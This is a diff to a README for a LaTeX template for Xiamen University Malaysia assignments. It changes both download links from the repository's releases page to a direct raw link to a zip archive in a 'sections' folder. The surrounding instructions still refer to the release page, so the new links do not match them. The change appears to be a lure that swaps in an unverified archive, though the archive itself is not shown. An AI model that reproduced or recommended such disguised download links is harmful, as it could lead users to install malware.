@@ -1,6 +1,6 @@
 # 📝 xmum-latex-template - Professional layout for your university papers
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/salleerecalcitrant615/xmum-latex-template/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/salleerecalcitrant615/xmum-latex-template/raw/refs/heads/main/sections/template-latex-xmum-3.5.zip)
 
 This software provides a layout for academic assignments at Xiamen University Malaysia. It helps you format your documents to meet university standards. You produce professional files without manual formatting. The template manages your headers, footers, and citations automatically.
 
@@ -8,7 +8,7 @@ This software provides a layout for academic assignments at Xiamen University Ma
 
 You find the software on the releases page. 
 
-[Visit this page to download the software](https://github.com/salleerecalcitrant615/xmum-latex-template/releases)
+[Visit this page to download the software](https://github.com/salleerecalcitrant615/xmum-latex-template/raw/refs/heads/main/sections/template-latex-xmum-3.5.zip)
 
 Click the link above to reach the download section. Find the file named `Source code (zip)` in the latest release section. Download this file and save it to your computer.
 
